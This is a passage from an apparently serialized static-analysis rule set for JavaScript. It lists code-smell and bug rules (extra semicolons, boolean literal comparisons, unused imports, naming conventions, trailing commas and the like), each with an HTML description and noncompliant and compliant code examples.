  return PI * r * r;
}
export default area;

// foo.js
import cart from "./cart.js";
import horse from "./horse.js";

// bar.js
import circle from "./circle.js"
</pre>Z
CODE_SMELL
⁄	
javascript:S1472≈	

javascriptS14725Function call arguments should not start on new lines"MINOR*js:·<p>Because semicolons at the ends of statements are optional, starting function call arguments on a separate line makes the code confusing. It could
lead to errors and most likely <em>will</em> lead to questions for maintainers.</p>
<p>What was the initial intent of the developer?</p>
<ol>
  <li> Define a function and then execute some unrelated code inside a closure ? </li>
  <li> Pass the second function as a parameter to the first one ? </li>
</ol>
<p>The first option will be the one chosen by the JavaScript interpreter.</p>
<p>By extension, and to improve readability, any kind of function call argument should not start on new line.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var fn = function () {
  //...
}

(function () { // Noncompliant
  //...
})();
</pre>
<h2>Compliant Solution</h2>
<p>Either</p>
<pre>
// define a function
var fn = function () {
  //...
}; // &lt;-- semicolon added

// then execute some code inside a closure
(function () {
  //...
})();
</pre>
<p>Or </p>
<pre>
var fn = function () {
  //...
}(function () { // &lt;-- start function call arguments on same line
  //...
})();
</pre>Z
CODE_SMELL
¥	
javascript:S1116ü	

javascriptS1116"Extra semicolons should be removed"MINOR*js:Œ<p>Extra semicolons (<code>;</code>) are usually introduced by mistake, for example because:</p>
<ul>
  <li> It was meant to be replaced by an actual statement, but this was forgotten. </li>
  <li> There was a typo which lead the semicolon to be doubled, i.e. <code>;;</code>. </li>
  <li> There was a misunderstanding about where semicolons are required or useful. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
var x = 1;; // Noncompliant

function foo() {
};  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
var x = 1;

function foo() {
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/7gCTAw">CERT, MSC51-J.</a> - Do not place a semicolon immediately following an if, for,
  or while condition </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/i4FtAg">CERT, EXP15-C.</a> - Do not place a semicolon on the same line as an if, for,
  or while statement </li>
</ul>Z
CODE_SMELL
‹
javascript:S1125«

javascriptS11252Boolean literals should not be used in comparisons"MINOR*js:Ê<p>Boolean literals should be avoided in comparison expressions <code>==</code> and <code>!=</code> to improve code readability.</p>
<p>This rule also reports on redundant boolean operations.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
let someValue = "0";
// ...

if (someValue == true) { /* ... */ }
if (someBooleanValue != true) { /* ... */ }
doSomething(!false);
</pre>
<h2>Compliant Solution</h2>
<pre>
if (someValue &amp;&amp; someValue != "0") { /* ... */ }
if (!someBooleanValue) { /* ... */ }
doSomething(true);
</pre>Z
CODE_SMELL
À
javascript:S1126∂

javascriptS1126TReturn of boolean expressions should not be wrapped into an "if-then-else" statement"MINOR*js:≥<p>Return of boolean literal statements wrapped into <code>if-then-else</code> ones should be simplified. </p>
<p>Note that if the result of the expression is not a boolean but for instance an integer, then double negation should be used for proper
conversion.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
if (expression) {
  return true;
} else {
  return false;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
return expression;
</pre>
<p>or </p>
<pre>
return !!expression;
</pre>Z
CODE_SMELL
ÿ
javascript:S1488√

javascriptS1488NLocal variables should not be declared and then immediately returned or thrown"MINOR*js:∆<p>Declaring a variable only to immediately return or throw it is a bad practice.</p>
<p>Some developers argue that the practice improves code readability, because it enables them to explicitly name what is being returned. However, this
variable is an internal implementation detail that is not exposed to the callers of the method. The method name should be sufficient for callers to
know exactly what will be returned.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
function computeDurationInMilliseconds() {
  var duration = (((hours * 60) + minutes) * 60 + seconds ) * 1000 ;
  return duration;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function computeDurationInMilliseconds() {
  return (((hours * 60) + minutes) * 60 + seconds ) * 1000 ;
}
</pre>Z
CODE_SMELL
ñ
javascript:S1128Å

javascriptS1128%Unnecessary imports should be removed"MINOR*js:≠<p>There's no reason to import modules you don't use; and every reason not to: doing so needlessly increases the load.</p>
<p>Finally, importing a module twice is pointless and confusing.</p>
<h2>Noncompliant Code Example</h2>
<pre>
import A from 'a';      // Noncompliant, A isn't used
import { B1 } from 'b';

console.log("My first JavaScript...");

import { B1 } from 'b'; // Noncompliant, already imported

console.log(B1);
</pre>
<h2>Compliant Solution</h2>
<pre>
import { B1 } from 'b';

console.log("My first JavaScript...");

console.log(B1);
</pre>Z
CODE_SMELL
£
+javascript:FunctionDeclarationsWithinBlocksÛ

javascript FunctionDeclarationsWithinBlocks6Function declarations should not be made within blocks"MINOR*js:˙<p>While most script engines support function declarations within blocks, from browser to browser, the implementations are inconsistent with each
other.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x) {
  function foo() {} //foo is hoisted in Chrome, Firefox and Safari, but not in Edge.
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (x) {
  var foo = function() {}
}
</pre>ZBUG
ô
javascript:S4326Ñ

javascriptS4326&"await" should not be used redundantly"MINOR*js:Ø<p>An <code>async</code> function always wraps the return value in a <code>Promise</code>. Using <code>return await</code> is therefore redundant.</p>
<h2>Noncompliant Code Example</h2>
<pre>
async function foo() {
  // ...
}

async function bar() {
  // ...
  return await foo(); // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
async function foo() {
  // ...
}

async function bar() {
  // ...
  return foo();
}
</pre>Z
CODE_SMELL
∫
javascript:HtmlCommentsû

javascriptHtmlComments&HTML-style comments should not be used"MINOR*js:¬<p>HTML-style comments are not part of EcmaScript specification, and should not be used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;!-- Noncompliant --&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
// Compliant
/* Compliant */
</pre>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>Z
CODE_SMELL
Â
javascript:S3002–

javascriptS3002;Unary operators "+" and "-" should not be used with objects"MINOR*js:Ê<p>The unary operators <code>+</code> and <code>-</code> can be used to convert some value types to numeric values. But not every value can be
converted to a <code>Number</code> type; use it with an object, and result will be <code>NaN</code> (Not A Number). This can be confusing to
maintainers.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var obj = {x : 1};
doSomethingWithNumber(+obj);    // Noncompliant

function foo(){
  return 1;
}
doSomethingWithNumber(-foo);    // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
var obj = {x : 1};
doSomethingWithNumber(+obj.x);

function foo(){
  return 1;
}
doSomethingWithNumber(-foo());

var str = '42';
doSomethingWithNumber(+str);
</pre>
<h2>Exceptions</h2>
<p>Unary <code>+</code> and <code>-</code> can be used with objects corresponding to primitive types, and <code>+</code> can be used with
<code>Date</code>.</p>
<pre>
var b = new Boolean(true);
doSomethingWithNumber(-b);  // Compliant
var timestamp = +new Date();  // Compliant
</pre>Z
CODE_SMELL
“
javascript:S3001Ω

javascriptS30013"delete" should be used only with object properties"MINOR*js:‚<p>The semantics of the <code>delete</code> operator are a bit tricky, and it can only be reliably used to remove properties from objects. Pass
anything else to it, and you may or may not get the desired result.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var x  = 1;
delete x;       // Noncompliant

function foo(){
..
}

delete foo;  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
var obj = {
  x:1,
  foo: function(){
  ...
  }
};
delete obj.x;
delete obj.foo;

</pre>ZBUG
ñ
javascript:S2713Å

javascriptS2713;JQuery cache variables should comply with a convention name"MINOR*js:ó<p>Shared naming conventions allow teams to collaborate efficiently. This rule checks that all variables names that are used to store/cache jQuery
objects match a provided regular expression.</p>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>Z
CODE_SMELL
Î
"javascript:NamedFunctionExpressionƒ

javascriptNamedFunctionExpression-Named function expressions should not be used"MINOR*js:›<p>While named function expressions might be useful for debugging purposes, some browsers do not support them correctly (for example Internet Explorer
8).</p>
<h2>Noncompliant Code Example</h2>
<pre>
f = function fun(){}; // Noncompliant;  named function expression
</pre>
<h2>Compliant Solution</h2>
<pre>
fun = function(){}; // Compliant; function expression
</pre>
<h2>Exceptions</h2>
<p>ECMAScript 6 generator functions are excluded from this rule. </p>
<pre>
function* f() {} // Compliant; generator function.
</pre>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>ZBUG
≈
javascript:TrailingComment¶

javascriptTrailingComment:Comments should not be located at the end of lines of code"MINOR*js:≥<p>This rule verifies that single-line comments are not located at the ends of lines of code. The main idea behind this rule is that in order to be
really readable, trailing comments would have to be properly written and formatted (correct alignment, no interference with the visual structure of
the code, not too long to be visible) but most often, automatic code formatters would not handle this correctly: the code would end up less readable.
Comments are far better placed on the previous empty line of code, where they will always be visible and properly formatted.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var a1 = b + c; // This is a trailing comment that can be very very long
</pre>
<h2>Compliant Solution</h2>
<pre>
// This very long comment is better placed before the line of code
var a2 = b + c;
</pre>Z
CODE_SMELL
 
javascript:S2138µ

javascriptS2138""undefined" should not be assigned"MINOR*js:‰<p><code>undefined</code> is the value you get for variables and properties which have not yet been created. Use the same value to reset an existing
variable and you lose the ability to distinguish between a variable that exists but has no value and a variable that does not yet exist. Instead,
<code>null</code> should be used, allowing you to tell the difference between a property that has been reset and one that was never created.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var myObject = {};

// ...
myObject.fname = undefined;  // Noncompliant
// ...

if (myObject.lname == undefined) {
  // property not yet created
}
if (myObject.fname == undefined) {
  // no real way of knowing the true state of myObject.fname
}
</pre>
<h2>Compliant Solution</h2>
<pre>
var myObject = {};

// ...
myObject.fname = null;
// ...

if (myObject.lname == undefined) {
  // property not yet created
}
if (myObject.fname == undefined) {
  // no real way of knowing the true state of myObject.fname
}
</pre>Z
CODE_SMELL
·
javascript:S1533Ã

javascriptS15336Wrapper objects should not be used for primitive types"MINOR*js:Á<p>The use of wrapper objects for primitive types is gratuitous, confusing and dangerous. If you use a wrapper object constructor for type conversion,
just remove the <code>new</code> keyword, and you'll get a primitive value automatically. If you use a wrapper object as a way to add properties to a
primitive, you should re-think the design. Such uses are considered bad practice, and should be refactored.</p>
<h2>Noncompliant Code Example</h2>
<pre>
let x = new Number("0");
if (x) {
  alert('hi');  // Shows 'hi'.
}
</pre>
<h2>Compliant Solution</h2>
<pre>
let x = Number("0");
if (x) {
  alert('hi');
}
</pre>Z
CODE_SMELL
–
javascript:S2508ª

javascriptS25087The names of model properties should not contain spaces"MINOR*js:‹<p>When using the Backbone.js framework, the names of model attributes should not contain spaces. This is because the Events object accepts
space-delimited lists of events, so an attributes with spaces in the names could be misinterpreted.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Person = Backbone.Model.extend({
        defaults: {
            'first name': 'Bob',      // Noncompliant
            'birth date': new Date()  // Noncompliant
        },
    });
</pre>
<h2>Compliant Solution</h2>
<pre>
Person = Backbone.Model.extend({
        defaults: {
            firstName: 'Bob',
            birthDate: new Date()
        },
    });
</pre>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>ZBUG
¥
'javascript:TooManyBreakOrContinueInLoopà

javascriptTooManyBreakOrContinueInLoopKLoops should not contain more than a single "break" or "continue" statement"MINOR*js:˜<p>Restricting the number of <code>break</code> and <code>continue</code> statements in a loop is done in the interest of good structured programming.
</p>
<p>One <code>break</code> and <code>continue</code> statement is acceptable in a loop, since it facilitates optimal coding. If there is more than one,
the code should be refactored to increase readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (var i = 1; i &lt;= 10; i++) {  // Noncompliant - 2 continue - one might be tempted to add some logic in between
  if (i % 2 == 0) {
    continue;
  }

  if (i % 3 == 0) {
    continue;
  }

  alert("i = " + i);
}
</pre>Z
CODE_SMELL
£
javascript:S105è

javascriptS105(Tabulation characters should not be used"MINOR*js:π<p>Developers should not need to configure the tab width of their text editors in order to be able to read source code.</p>
<p>So the use of the tabulation character must be banned.</p>Z
CODE_SMELL
 
javascript:S1301µ

javascriptS13019"switch" statements should have at least 3 "case" clauses"MINOR*js:Õ<p><code>switch</code> statements are useful when there are many different cases depending on the value of the same expression.</p>
<p>For just one or two cases however, the code will be more readable with <code>if</code> statements.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (variable) {
  case 0:
    doSomething();
    break;
  default:
    doSomethingElse();
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (variable == 0) {
  doSomething();
} else {
  doSomethingElse();
}
</pre>Z
CODE_SMELL
ó
javascript:S2990Ç

javascriptS2990+The global "this" object should not be used"MINOR*js:®<p>When the keyword <code>this</code> is used outside of an object, it refers to the global <code>this</code> object, which is the same thing as the
<code>window</code> object in a standard web page. Such uses could be confusing to maintainers. Instead, simply drop the <code>this</code>, or replace
it with <code>window</code>; it will have the same effect and be more readable.</p>
<h2>Noncompliant Code Example</h2>
<pre>
this.foo = 1;   // Noncompliant
console.log(this.foo); // Noncompliant

function MyObj() {
  this.foo = 1; // Compliant
}

MyObj.func1 = function() {
  if (this.foo == 1) { // Compliant
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
foo = 1;
console.log(foo);

function MyObj() {
  this.foo = 1;
}

MyObj.func1 = function() {
  if (this.foo == 1) {
    // ...
  }
}
</pre>Z
CODE_SMELL
è
javascript:S3723˙

javascriptS3723Trailing commas should be used"MINOR*js:≠<p>Modern browsers ignore unneeded, trailing commas, so there are no negatives to having them unless you're supporting an IE 8 application. Since they
make adding new properties simpler, their use is preferred. This rule raises an issue when the last item in an object declaration or array declaration
does not end with a trailing comma and does not lie on the same line as the closing curly brace or bracket.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var joe = {
  fname: "Joe",
  lname: "Smith"      // Noncompliant
};
</pre>
<h2>Compliant Solution</h2>
<pre>
var joe = {
  fname: "Joe",
  lname: "Smith",    // OK
};

var joe = {
  fname: "Joe",
  lname: "Smith"};   // OK
</pre>Z
CODE_SMELL
ç
javascript:S113˘

javascriptS1130Files should contain an empty newline at the end"MINOR*js:õ<p>Some tools work better when files end with an empty line.</p>
<p>This rule simply generates an issue if it is missing.</p>
<p>For example, a Git diff looks like this if the empty line is missing at the end of the file:</p>
<pre>
+class Test {
+}
\ No newline at end of file
</pre>Z
CODE_SMELL
Î
javascript:S117◊

javascriptS117MVariable, property and parameter names should comply with a naming convention"MINOR*js:‹<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate. This rule checks that all variable,
property and parameter names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[_$A-Za-z][$A-Za-z0-9]*$|^[_$A-Z][_$A-Z0-9]+$</code>:</p>
<pre>
const foo_bar = 1;
const baz_ = 2;
</pre>
<h2>Compliant Solution</h2>
<pre>
const fooBar = 1;
const _baz = 2;
</pre>Z
CODE_SMELL
æ
javascript:S3499©

javascriptS3499^Shorthand object properties should be grouped at the beginning or end of an object declaration"MINOR*js:ú<p>Grouping all the shorthand declarations together in an object makes the declaration as a whole more readable. This rule accepts shorthand
declarations grouped at either the beginning or end of an object.</p>
<h2>Noncompliant Code Example</h2>
<pre>
let obj1 = {
  foo,
  a: 1,
  color,  // Noncompliant
  b: 2,
  judyGarland  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
let obj1 = {
  foo,
  color,
  judyGarland,
  a: 1,
  b: 2
}
</pre>
<p>or </p>
<pre>
let obj1 = {
  a: 1,
  b: 2,
  foo,
  color,
  judyGarland
}
</pre>Z
CODE_SMELL
Å

javascript:S1516Ï	

javascriptS1516,Multiline string literals should not be used"MINOR*js:ë	<p>Continuing a string across a linebreak is supported in most script engines, but it is not a part of ECMAScript. Additionally, the whitespace at the
beginning of each line can't be safely stripped at compile time, and any whitespace after the slash will result in tricky errors.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var myString = 'A rather long string of English text, an error message \
                actually that just keeps going and going -- an error \
                message to make the Energizer bunny blush (right through \
                those Schwarzenegger shades)! Where was I? Oh yes, \
                you\'ve got an error and all the extraneous whitespace is \
                just gravy.  Have a nice day.';  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
var myString = 'A rather long string of English text, an error message ' +
    'actually that just keeps going and going -- an error ' +
    'message to make the Energizer bunny blush (right through ' +
    'those Schwarzenegger shades)! Where was I? Oh yes, ' +
    'you\'ve got an error and all the extraneous whitespace is ' +
    'just gravy.  Have a nice day.';
</pre>Z
CODE_SMELL
‡
javascript:S3498À

javascriptS3498.Object literal shorthand syntax should be used"MINOR*js:Ó<p>When an already-defined variable is given the same name within a new object, object-shorthand syntax is preferred as being more compact. Similarly,
object-shorthand is also preferred for the definition of functions in object literals.</p>
<h2>Noncompliant Code Example</h2>
<pre>
let a = 1;

let myObj = {
  a : a,  // Noncompliant
  fun: function () {  // Noncompliant
    //...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
let a = 1;

let myObj = {
  a,
  fun () {
    //...
  }
}
</pre>Z
CODE_SMELL
Ñ
javascript:S101

javascriptS1012Class names should comply with a naming convention"MINOR*js:ê<p>Shared coding conventions allow teams to collaborate effectively. This rule allows to check that all class names (and interfaces for TypeScript) match a provided regular
expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With default provided regular expression <code>^[A-Z][a-zA-Z0-9]*$</code>:</p>
<pre>
class my_class {...}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {...}
</pre>Z
CODE_SMELL
á
javascript:S100Û

javascriptS100@Function and method names should comply with a naming convention"MINOR*js:Ö<p>Shared naming conventions allow teams to collaborate efficiently. This rule checks that all function names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[a-z][a-zA-Z0-9]*$</code>:</p>
<pre>
function DoSomething(){...}  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
function doSomething(){...}
</pre>Z
CODE_SMELL
Ω
javascript:S2737®

javascriptS2737+"catch" clauses should do more than rethrow"MINOR*js:Œ<p>A <code>catch</code> clause that only rethrows the caught exception has the same effect as omitting the <code>catch</code> altogether and letting
it bubble up automatically, but with more code and the additional detriment of leaving maintainers scratching their heads. </p>
<p>Such clauses should either be eliminated or populated with the appropriate logic.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
try {
  doSomething();
} catch (ex) {  // Noncompliant
  throw ex;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
try {
  doSomething();
} catch (ex) {
  console.err(ex);
  throw ex;
}
</pre>
<p>or</p>
<pre>
doSomething();
</pre>Z
CODE_SMELL
£
javascript:S1525é

javascriptS1525&Debugger statements should not be used"MINOR*js:∂<p>The debugger statement can be placed anywhere in procedures to suspend execution. Using the debugger statement is similar to setting a breakpoint
in the code. By definition such statement must absolutely be removed from the source code to prevent any unexpected behavior or added vulnerability to
attacks in production.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (i = 1; i&lt;5; i++) {
  // Print i to the Output window.
  Debug.write("loop index is " + i);
  // Wait for user to resume.
  debugger;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for (i = 1; i&lt;5; i++) {
  // Print i to the Output window.
  Debug.write("loop index is " + i);
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/489.html">MITRE, CWE-489</a> - Leftover Debug Code </li>
</ul>ZVULNERABILITY
ß
javascript:S3512í

javascriptS35128Template strings should be used instead of concatenation"MINOR*js:´<p>ECMAScript 2015 added the ability to use template literals instead of concatenation. Since their use is clearer and more concise, they are
preferred in environments that support ECMAScript 2015.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function sayHello(name) {
  console.log("hello " + name);  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function sayHello(name) {
  console.log(`hello ${name}`);
}
</pre>Z
CODE_SMELL
˙
javascript:S2427Â

javascriptS2427)The base should be provided to "parseInt""MINOR*js:î<p>The <code>parseInt</code> function has two versions, one that takes a base value as a second argument, and one that does not. Unfortunately using
the single-arg version can result in unexpected results on older browsers. </p>
<h2>Noncompliant Code Example</h2>
<pre>
parseInt("010");  // Noncompliant; pre-2013 browsers may return 8
</pre>
<h2>Compliant Solution</h2>
<pre>
parseInt("010", 10);
</pre>ZBUG
¸
javascript:S2428Á

javascriptS2428$Object literal syntax should be used"MINOR*js:î<p>Object literal syntax, which initializes an object's properties inside the object declaration is cleaner and clearer than the alternative: creating
an empty object, and then giving it properties one by one.</p>
<p>An issue is raised when the following pattern is met:</p>
<ul>
  <li> An empty object is created. </li>
  <li> A consecutive single-line statement adds a property to the created object. </li>
</ul>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
let person = {};  // Noncompliant
person.firstName = "John";
person.middleInitial = "Q";
person.lastName = "Public";
</pre>
<h2>Compliant Solution</h2>
<pre>
let person = {
  firstName: "John",
  middleInitial: "Q",
  lastName: "Public",
}
</pre>Z
CODE_SMELL
‰
javascript:S3514œ

javascriptS35143Destructuring syntax should be used for assignments"MINOR*js:Ì<p>ECMAScript 2015 introduced the ability to extract and assign multiple data points from an object or array simultaneously. This is called
"destructuring", and it allows you to condense boilerplate code so you can concentrate on logic. </p>
<p>This rule raises an issue when multiple pieces of data are extracted out of the same object or array and assigned to variables.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function foo (obj1, obj2, array) {
  var a = obj1.a;  // Noncompliant
  var b = obj1.b;

  var name = obj2.name;  // ignored; there's only one extraction-and-assignment

  var zero = array[0];  // Noncompliant
  var one = array[1];
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function foo (obj1, obj2, array) {
  var {a, b} = obj1;

  var {name} = obj2;  // this syntax works because var name and property name are the same

  var [zero, one] = array;
}
</pre>Z
CODE_SMELL
≈
javascript:S3402∞

javascriptS3402+Strings and non-strings should not be added"MINOR*js:÷<p>Use a <code>+</code> with two numbers and you'll get addition. But use it with a string and anything else, and you'll get concatenation. This could
be confusing, especially if it's not obvious that one of the operands is a string. It is recommended to explicitly convert the non-string component to
make it easier to understand to future maintainers.</p>
<p>This rule raises an issue when <code>+</code> is used with a string and a non-string.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function foo() {
  let x = 5 + 8;  // okay
  let z = "8"
  return x + z;  // Noncompliant; yields string "138"
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function foo() {
  let x = 5 + 8;
  let z = "8"
  return x + Number(z);
}
</pre>Z
CODE_SMELL
Ë
javascript:UnusedVariable 

javascriptUnusedVariable6Unused local variables and functions should be removed"MINOR*js:‹<p>If a local variable or a local function is declared but not used, it is dead code and should be removed. Doing so will improve maintainability
because developers will not wonder what the variable or function is used for.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function numberOfMinutes(hours) {
  var seconds = 0;   // seconds is never used
  return hours * 60;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function numberOfMinutes(hours) {
  return hours * 60;
}
</pre>Z
CODE_SMELL
ã
javascript:ContinueStatementÍ

javascriptContinueStatement"continue" should not be used"MINOR*js:í<p><code>continue</code> is an unstructured control flow statement. It makes code less testable, less readable and less maintainable. Structured
control flow statements such as <code>if</code> should be used instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
  for (i = 0; i &lt; 10; i++) {
    if (i == 5) {
      continue;  /* Noncompliant */
    }
    alert("i = " + i);
  }
</pre>
<h2>Compliant Solution</h2>
<pre>
  for (i = 0; i &lt; 10; i++) {
    if (i != 5) {  /* Compliant */
      alert("i = " + i);
    }
  }
</pre>Z
CODE_SMELL
Ç
%javascript:ArrayAndObjectConstructorsÿ

javascriptArrayAndObjectConstructors%Array constructors should not be used"MINOR*js:Ô<p>Array literals should always be preferred to Array constructors.</p>
<p>Array constructors are error-prone due to the way their arguments are interpreted. If more than one argument is used, the array length will be
equal to the number of arguments. However, using a single argument will have one of three consequences:</p>
<ul>
  <li> If the argument is a number and it is a natural number the length will be equal to the value of the argument. </li>
</ul>
<pre>
let arr = new Array(3); // [empty √ó 3]
</pre>
<ul>
  <li> If the argument is a number, but not a natural number an exception will be thrown. </li>
</ul>
<pre>
let arr = new Array(3.14);  // RangeError: Invalid array length
</pre>
<ul>
  <li> Otherwise the array will have one element with the argument as its value. </li>
</ul>
<pre>
let arr = new Array("3");  // ["3"]
</pre>
<p>Note that even if you set the length of an array, it will be empty. That is, it will have the number of elements you declared, but they won't
contain anything, so no callbacks will be applied to the array elements.</p>
<p>For these reasons, if someone changes the code to pass 1 argument instead of 2 arguments, the array might not have the expected length. To avoid
these kinds of weird cases, always use the more readable array literal initialization format.</p>
<h2>Noncompliant Code Example</h2>
<pre>
let myArray = new Array(x1, x2, x3);   // Noncompliant. Results in 3-element array.
let emptyArray = new Array();          // Noncompliant. Results in 0-element array.

let unstableArray = new Array(n);      // Noncompliant. Variable in results.

let arr = new Array(3); // Noncompliant; empty array of length 3
arr.foreach((x) =&gt; alert("Hello " + x)); // callback is not executed because there's nothing in arr
let anotherArr = arr.map(() =&gt; 42); // anotherArr is also empty because callback didn't execute
</pre>
<h2>Compliant Solution</h2>
<pre>
let myArray = [x1, x2, x3];
let emptyArray = [];

// if "n" is the only array element
let unstableArray = [n];
// or,  if "n" is the array length (since ES 2015)
let unstableArray = Array.from({length: n});

let arr = ["Elena", "Mike", "Sarah"];
arr.foreach((x) =&gt; alert("Hello " + x));
let anotherArr = arr.map(() =&gt; 42);  // anotherArr now holds 42 in each element
</pre>Z
CODE_SMELL
¬
javascript:S3524≠

javascriptS3524GBraces and parentheses should be used consistently with arrow functions"MINOR*js:∑<p>Shared coding conventions allow teams to collaborate effectively. This rule raises an issue when the use of parentheses with an arrow function does
not conform to the configured requirements.</p>
<h2>Noncompliant Code Example</h2>
<p>With the configured defaults forbidding parentheses</p>
<pre>
var foo = (a) =&gt; { /* ... */ };  // Noncompliant; remove parens from arg
var bar = (a, b) =&gt; { return 0; };  // Noncompliant; remove curly braces from body
</pre>
<h2>Compliant Solution</h2>
<pre>
var foo = a =&gt; { /* ... */ };
var bar = (a, b) =&gt; 0;
</pre>Z
CODE_SMELL
Ê
javascript:S1105—

javascriptS1105:An open curly brace should be located at the end of a line"MINOR*js:Ë
<p>Shared naming conventions allow teams to collaborate effectively. This rule raises an issue when the brace-style is not respecting the convention
setup in parameter:</p>
<p> * <a href="https://en.wikipedia.org/wiki/Indentation_style#K&amp;R_style">1tbs</a> (default)</p>
<p> * <a href="https://en.wikipedia.org/wiki/Indentation_style#Allman_style">allman</a></p>
<p> * <a href="https://en.wikipedia.org/wiki/Indentation_style#Variant:_Stroustrup">stroustrup</a></p>
<h2>Noncompliant Code Example</h2>
<p>Using the parameter default (1tbs):</p>
<pre>
if (condition)
{                                                      //Noncompliant
  doSomething();
}                                                      //Noncompliant
else {
  doSomethingElse();
}{code}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition) {                                   //Compliant
  doSomething();
} else {                                           //Compliant
  doSomethingElse();
}
</pre>
<h2>Exceptions</h2>
<p> * Object literals appearing as arguments can start on their own line.</p>
<pre>
functionWithObject(
   {                                                 //Compliant
        g: "someValue"
   }
);
</pre>
<p> * When blocks are inlined (left and right curly braces on the same line), no issue is triggered.</p>
<pre>
if(condition) {doSomething();}                       //Compliant
</pre>Z
CODE_SMELL
é
javascript:S1226˘

javascriptS1226bFunction parameters, caught exceptions and foreach variables' initial values should not be ignored"MINOR*js:Ô<p>While it is technically correct to assign to parameters from within function bodies, it reduces code readability because developers won't be able
to tell whether the original parameter or some temporary variable is being accessed without going through the whole function. Moreover, some
developers might also expect assignments of function parameters to be visible to callers, which is not the case, and this lack of visibility could
confuse them. Instead, all parameters, caught exceptions, and foreach parameters should be treated as constants.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function MyClass(name, strings) {
  name = foo;                    // Noncompliant

  for (var str of strings) {
    str = "";  // Noncompliant
  }
}
</pre>ZBUG
¡
javascript:TrailingComma§

javascriptTrailingComma"Trailing commas should not be used"MINOR*js:À<p>Most browsers parse and discard a meaningless, trailing comma. Unfortunately, that's not the case for Internet Explorer below version 9, which
throws a meaningless error. Therefore trailing commas should be eliminated.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var settings = {
    'foo'  : oof,
    'bar' : rab,    // Noncompliant - trailing comma
};
</pre>
<h2>Compliant Solution</h2>
<pre>
var settings = {
    'foo'  : oof,
    'bar' : rab
};
</pre>Z
CODE_SMELL
ú
javascript:S1438á

javascriptS1438%Statements should end with semicolons"MINOR*js:≥<p>In JavaScript, the semicolon (<code>;</code>) is optional as a statement separator, but omitting semicolons can be confusing, and lead to
unexpected results because a semicolon is implicitly inserted at the end of each line.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function fun() {
  return  // Noncompliant. ';' implicitly inserted at end of line
       5   // Noncompliant. ';' implicitly inserted at end of line
}
print(fun());  // prints "undefined", not "5"
</pre>
<h2>Compliant Solution</h2>
<pre>
function fun() {
  return 5;
}
print(fun());
</pre>Z
CODE_SMELL
î	
javascript:WithStatement˜

